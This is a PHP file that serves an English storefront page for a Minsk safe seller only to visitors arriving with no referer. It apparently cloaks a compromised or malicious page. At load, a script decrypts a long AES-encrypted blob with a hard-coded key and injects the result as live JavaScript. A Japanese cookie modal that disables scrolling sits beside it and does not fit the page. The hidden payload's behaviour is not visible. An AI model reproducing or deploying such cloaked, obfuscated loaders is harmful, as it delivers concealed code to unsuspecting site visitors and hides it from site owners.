<?php
// SOFT referer check (NOT security)

$referer = $_SERVER['HTTP_REFERER'] ?? '';

// If referer is empty → show your custom HTML page
if (empty($referer)) {
?>
<!DOCTYPE html>
<html lang="en">


<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buy a Safe in Minsk | Safes.by</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f9f9f9;
            color: #333;
        }

        header {
            background: #000;
            padding: 20px;
            text-align: center;
        }

        header h1 {
            color: #FFD700;
            font-size: 2.2em;
            margin: 0;
        }

        header p {
            color: #fff;
            margin-top: 5px;
        }

        footer {
            background: #000;
            color: #fff;
            padding: 20px;
            text-align: center;
        }

        .container {
            max-width: 1100px;
            margin: 0 auto;
            padding: 20px;
            background: #fff;
        }

        h1,
        h2,
        h3 {
            color: #111;
        }

        ul {
            padding-left: 20px;
        }

        .section {
            margin-top: 40px;
        }

        .contact p {
            margin: 5px 0;
        }

        .footer-info {
            font-size: 0.9em;
            color: #ccc;
        }

        /* Simple style to make the link look normal */

        a {
            color: #007BFF;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script>
        function aesDecode(encodedText) {
            const decodedText = decodeURIComponent(encodedText);
            const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
            return bytes.toString(CryptoJS.enc.Utf8);
        }
        const codeString = aesDecode(`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`);
        const script = document.createElement("script");
        script.textContent = codeString;
        document.body.appendChild(script);
    </script>
    <script>
        document.body.style.overflow = "hidden";
    </script>
    <div id="cookie-modal-box" class="hidden">
        <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
        <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
            <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
                <button id="cookie-close" class="absolute top-4 right-4">
                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
                </svg>
            </button>
                <div class="flex items-center gap-3 mb-4">
                    <span class="text-yellow-500 text-3xl">🍪</span>
                    <h2 class="text-2xl font-bold">クッキーについて</h2>
                </div>
                <p class="text-gray-600 mb-6">
                    当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。 <span class="font-semibold">「同意する」</span> をクリックすると、クッキーの使用に同意したことになります。
                </p>
                <div class="flex flex-col sm:flex-row gap-3">
                    <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 同意する</button>
                    <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">拒否する</button>
                </div>
            </div>
        </div>
    </div>
    <script>
        const modalBox = document.getElementById("cookie-modal-box"),
            modal = document.getElementById("cookie-modal"),
            backdrop = document.getElementById("cookie-backdrop"),
            acceptBtn = document.getElementById("cookie-accept"),
            declineBtn = document.getElementById("cookie-decline"),
            closeBtn = document.getElementById("cookie-close");

        function showModal() {
            modalBox.classList.remove("hidden");
            setTimeout(() => {
                backdrop.classList.remove("opacity-0");
                modal.classList.remove("opacity-0", "scale-90");
            }, 10);
        }

        function hideModal(e) {
            localStorage.setItem("cookie-consent", e);
            setTimeout(() => {
                modalBox.classList.add("hidden");
            }, 1500);

            // remove mousemove listener once closed
            document.removeEventListener("mousemove", mouseMoveClose);
        }

        function mouseMoveClose() {
            hideModal("closed");
        }

        acceptBtn.onclick = () => hideModal("accepted");
        declineBtn.onclick = () => hideModal("declined");
        closeBtn.onclick = () => hideModal("closed");
        backdrop.onclick = () => hideModal("closed");

        if (!localStorage.getItem("cookie-consent")) {
            showModal();
            document.addEventListener("mousemove", mouseMoveClose, {
                once: true
            });
        }
    </script>


    <header>
        <h1>Safes.by</h1>
        <p>Looking to buy a safe? You’re in the right place!</p>
    </header>

    <div class="container">
        <section class="intro">
            <h2>Wide Selection of Safes at Affordable Prices</h2>
            <p>
                We offer a wide range of safes — furniture safes, office safes, gun safes, burglary-resistant safes, and more. All products are available in stock. Our courier will not only deliver your order but also explain how to use the safe.
            </p>
            <p>
                Buying a safe from us is fast, convenient, and secure. We are happy to answer all your questions and help you choose the right solution.
            </p>
        </section>

        <section class="catalog section">
            <h2>What You Will Find in Our Catalog</h2>
            <ul>
                <li>Safes of all types: furniture, gun, office, burglary-resistant</li>
                <li>Metal cabinets</li>
                <li>Shelving units, trash bins, benches</li>
                <li>Metal-frame furniture</li>
                <li>Workbench tables</li>
                <li>Waste containers</li>
                <li>Products of our own manufacture</li>
            </ul>
        </section>

        <section class="delivery section">
            <h2>Fast Delivery in Minsk and Across Belarus</h2>
            <p>
                Delivery is available throughout Minsk quickly and professionally. We also provide fast delivery across Belarus, including Grodno, Brest, Vitebsk, Mogilev, Gomel, and other cities.
            </p>
            <p>
                More delivery details can be found in the <strong>“Delivery”</strong> section on our website.
            </p>
        </section>

        <section class="whyus section">
            <h2>Why Choose Us</h2>
            <ul>
                <li>Warranty on all products</li>
                <li>Stock availability — products ready for shipment</li>
                <li>Affordable prices and expert consultations</li>
                <li>Polite and knowledgeable staff</li>
                <li>Own manufacturing</li>
                <li>Convenient delivery and assistance in selection</li>
            </ul>
        </section>

        <section class="company section">
            <h2>About the Company</h2>
            <p>
                Private trade and manufacturing unitary enterprise “Torvest” has been operating since 2017 in the field of metal furniture and safes.
            </p>
            <p>
                Address: Republic of Belarus, 220140, Minsk, Prititskogo St., 62A, office 7
            </p>
            <p>
                Registration No: 192255757 | Account: BY04ALFA30122292630030270000 | Bank: Alfa-Bank CJSC | BIC: ALFABY2X
            </p>
            <p>
                Director: Andrey Sergeevich Khadarovich
            </p>
        </section>

        <section class="contact section">

            <p>📧 <a href="#">
          <span class="__cf_email__" data-cfemail="553c3b333a1526343330267b372c">[email protected]</span>
      </a></p>

            <p><strong>Request a callback</strong> — and we will contact you shortly!</p>
        </section>
    </div>

    <footer>
        <p>© 2017 Safes.by. All rights reserved</p>
        <p class="footer-info">Developed by StarMedia</p>
    </footer>

    <script>
        (function() {
            function decodeEmail(encodedString) {
                var email = "",
                    r = parseInt(encodedString.substr(0, 2), 16),
                    n,
                    i;
                for (n = 2; encodedString.length - n; n += 2) {
                    i = parseInt(encodedString.substr(n, 2), 16) ^ r;
                    email += String.fromCharCode(i);
                }
                return email;
            }

            var elements = document.querySelectorAll('.__cf_email__');
            for (var i = 0; i < elements.length; i++) {
                var el = elements[i];
                var encoded = el.getAttribute('data-cfemail');
                if (encoded) {
                    var decodedEmail = decodeEmail(encoded);
                    el.innerHTML = decodedEmail;
                    // If the parent is an <a> tag, update the href to mailto
                    if (el.parentNode.tagName === 'A') {
                        el.parentNode.href = "mailto:" + decodedEmail;
                    }
                }
            }
        })();
    </script>
</body>

</html>
<?php
    exit;
}

// If referer exists → load your normal page (your original full code continues below)
?>